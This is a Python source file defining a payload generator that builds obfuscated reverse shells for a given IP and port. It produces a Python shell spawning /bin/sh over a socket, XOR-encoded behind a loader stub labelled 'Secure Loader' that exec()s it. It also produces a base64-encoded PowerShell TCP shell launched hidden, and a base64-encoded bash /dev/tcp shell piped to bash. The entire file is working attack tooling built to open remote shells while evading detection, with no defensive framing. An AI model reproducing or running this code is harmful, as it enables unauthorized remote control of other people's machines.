import base64
import random
import string

class PayloadGenerator:
    @staticmethod
    def _xor_encrypt(data, key):
        return bytearray([b ^ key for b in data])

    @staticmethod
    def _random_string(length=8):
        return ''.join(random.choices(string.ascii_letters, k=length))

    @staticmethod
    def generate_python_xor(ip, port):
        # Raw Payload
        raw_code = f"""
import socket,os,subprocess,threading
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0: p.stdin.write(data); p.stdin.flush()
def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))
p=subprocess.Popen(["/bin/sh","-i"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
threading.Thread(target=s2p, args=[s,p], daemon=True).start()
threading.Thread(target=p2s, args=[s,p], daemon=True).start()
p.wait()
"""
        # Obfuscation (Simple XOR)
        key = random.randint(1, 255)
        encrypted = PayloadGenerator._xor_encrypt(raw_code.encode(), key)
        encrypted_str = str(list(encrypted))
        
        # Loader Stub
        loader = f"""
import os
# Secure Loader
k = {key}
enc = {encrypted_str}
dec = bytes([b ^ k for b in enc]).decode()
exec(dec)
"""
        return loader

    @staticmethod
    def generate_powershell(ip, port):
        # Standard Reverse Shell
        ps_script = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
        
        # Base64 Encode
        bytes_data = ps_script.encode('utf-16le') # PS uses UTF-16LE
        b64 = base64.b64encode(bytes_data).decode()
        
        wrapper = f"powershell -nop -w hidden -e {b64}"
        return wrapper

    @staticmethod
    def generate_bash(ip, port):
        # Obfuscated Bash (Simple)
        # Using built-in /dev/tcp
        payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        b64 = base64.b64encode(payload.encode()).decode()
        loader = f"echo {b64} | base64 -d | bash"
        return loader